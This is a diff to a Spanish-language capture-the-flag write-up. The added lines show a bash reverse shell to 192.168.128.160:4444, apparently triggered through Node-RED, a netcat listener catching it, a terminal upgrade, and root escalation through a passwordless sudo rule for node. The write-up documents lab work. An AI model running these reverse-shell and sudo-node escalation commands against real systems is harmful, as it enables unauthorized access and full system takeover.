@@ -250,6 +250,8 @@ Permitiendo ingresar al usuario dev, del cual no se posee la contraseña.
 
 ![](Evidencias_Visuales/inyección_NODE-RED)
 
+bash -c 'bash -i >& /dev/tcp/192.168.128.160/4444 0>&1'
+
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ nc -lvnp 4444
@@ -258,6 +260,34 @@ connect to [192.168.128.160] from (UNKNOWN) [10.128.154.75] 46936
 bash: no se puede establecer el grupo de proceso de terminal (337): Función ioctl no apropiada para el dispositivo
 bash: no hay control de trabajos en este shell
 dev@tnightmarebc:~$ 
+```
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.128.160] from (UNKNOWN) [10.130.173.137] 37516
+bash: no se puede establecer el grupo de proceso de terminal (307): Función ioctl no apropiada para el dispositivo
+bash: no hay control de trabajos en este shell
+dev@tnightmarebc:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+dev@tnightmarebc:~$ ^Z
+zsh: suspended  nc -lvnp 4444
+                                                                                                        
+┌──(kali㉿kali)-[~]
+└─$ stty raw -echo;fg       
+[2]  - continued  nc -lvnp 4444
+
+dev@tnightmarebc:~$ 
+dev@tnightmarebc:~$ export TERM=xterm
+dev@tnightmarebc:~$ sudo -l
+Matching Defaults entries for dev on tnightmarebc:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User dev may run the following commands on tnightmarebc:
+    (root) NOPASSWD: /usr/bin/node
+dev@tnightmarebc:~$ sudo node -e 'require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})'
+root@tnightmarebc:/home/dev# 
 ```
 
 ## Flags encontradas
